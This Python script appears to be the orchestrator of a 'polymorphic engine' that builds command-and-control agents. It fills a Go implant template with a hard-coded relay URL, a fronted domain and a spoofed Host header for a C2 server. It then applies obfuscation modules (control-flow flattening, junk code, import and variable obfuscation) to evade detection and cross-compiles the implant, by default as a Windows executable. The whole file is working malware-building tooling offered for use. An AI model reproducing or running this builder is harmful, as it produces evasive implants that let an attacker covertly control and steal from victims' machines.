#!/usr/bin/env python3
# polymorphic-engine/src/orchestrator.py
import os
import sys
import subprocess
import random
import string
import tempfile
import argparse
import re

LISTENER_URL = "https://jocky-relay.dm2528v.workers.dev"
FRONT_DOMAIN = "jocky-relay.dm2528v.workers.dev"
HOST_HEADER = "c2-api.jocky.internal"

def generate_agent_id():
    return "agent-" + ''.join(random.choices(string.hexdigits.lower(), k=8))

def apply_obfuscations(content):
    """Try multiple function names for each module."""
    modules = [
        ("control_flow_flattener", ["flatten_control_flow", "flatten", "obfuscate", "process"]),
        ("junk_code_injector", ["inject_junk", "inject", "add_junk", "process"]),
        ("import_table_obfuscator", ["obfuscate_imports", "obfuscate", "process"]),
        ("variable_encryption", ["encrypt_variables", "encrypt", "obfuscate", "process"]),
    ]
    
    applied = False
    for module_name, func_names in modules:
        try:
            module = __import__(module_name)
            for func_name in func_names:
                if hasattr(module, func_name):
                    func = getattr(module, func_name)
                    content = func(content)
                    print(f"[+] Applied {module_name}.{func_name}")
                    applied = True
                    break
            else:
                print(f"[!] No suitable function found in {module_name}")
        except ImportError:
            print(f"[!] Module {module_name} not found")
        except Exception as e:
            print(f"[!] Error in {module_name}: {e}")

    if not applied:
        print("[*] No obfuscation modules applied. Using fallback junk injection...")
        junk = []
        for _ in range(random.randint(2, 5)):
            var_name = ''.join(random.choices(string.ascii_lowercase, k=8))
            val = random.randint(1, 999)
            junk.append(f'var {var_name} = {val} // junk')
        junk_code = '\n'.join(junk)

        # Find the position after the import block
        lines = content.split('\n')
        insert_pos = 0
        in_import = False
        for i, line in enumerate(lines):
            if line.startswith('package '):
                in_import = True
                continue
            if in_import and line.startswith('import ('):
                # Multi-line import
                for j in range(i+1, len(lines)):
                    if lines[j].strip() == ')':
                        insert_pos = j + 1
                        break
                break
            if in_import and line.startswith('import '):
                # Single-line import
                insert_pos = i + 1
                break

        if insert_pos == 0:
            # Fallback: after package line if no import found
            for i, line in enumerate(lines):
                if line.startswith('package '):
                    insert_pos = i + 1
                    break

        lines.insert(insert_pos, junk_code)
        content = '\n'.join(lines)
        print("[+] Applied fallback junk injection")

    return content

def build_agent(template_path, output_dir, target_os="windows", target_arch="amd64", use_obfuscation=True):
    os.makedirs(output_dir, exist_ok=True)

    with open(template_path, 'r') as f:
        content = f.read()

    agent_id = generate_agent_id()
    print(f"[+] Agent ID: {agent_id}")

    replacements = {
        '{{LISTENER_URL}}': LISTENER_URL,
        '{{FRONT_DOMAIN}}' : FRONT_DOMAIN,
        '{{HOST_HEADER}}'  : HOST_HEADER,
        '{{AGENT_ID}}'     : agent_id,
    }
    for placeholder, value in replacements.items():
        content = content.replace(placeholder, value)

    if use_obfuscation:
        content = apply_obfuscations(content)

    with tempfile.NamedTemporaryFile(mode='w', suffix='.go', delete=False) as tmp:
        tmp.write(content)
        tmp_path = tmp.name

    output_name = os.path.join(output_dir, f"agent_{agent_id}")
    if target_os == "windows":
        output_name += ".exe"

    env = os.environ.copy()
    env['GOOS'] = target_os
    env['GOARCH'] = target_arch
    cmd = ['go', 'build', '-o', output_name, tmp_path]

    print(f"[*] Compiling for {target_os}/{target_arch} ...")
    result = subprocess.run(cmd, env=env, capture_output=True)
    if result.returncode != 0:
        print("[!] Compilation failed:")
        print(result.stderr.decode())
        os.unlink(tmp_path)
        return None, None

    os.unlink(tmp_path)
    print(f"[+] Agent built: {output_name}")
    return output_name, agent_id

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--output-dir", "-o", default="./build", help="Output directory")
    parser.add_argument("--no-obfuscation", action="store_true", help="Skip obfuscation")
    parser.add_argument("--os", default="windows", choices=["windows", "linux", "darwin"])
    parser.add_argument("--arch", default="amd64", choices=["amd64", "386", "arm64"])
    args = parser.parse_args()

    script_dir = os.path.dirname(os.path.abspath(__file__))
    template_path = os.path.join(script_dir, "..", "..", "agent", "main.go")
    if not os.path.exists(template_path):
        print(f"[-] Agent template not found at {template_path}")
        sys.exit(1)

    build_agent(template_path, args.output_dir, args.os, args.arch, not args.no_obfuscation)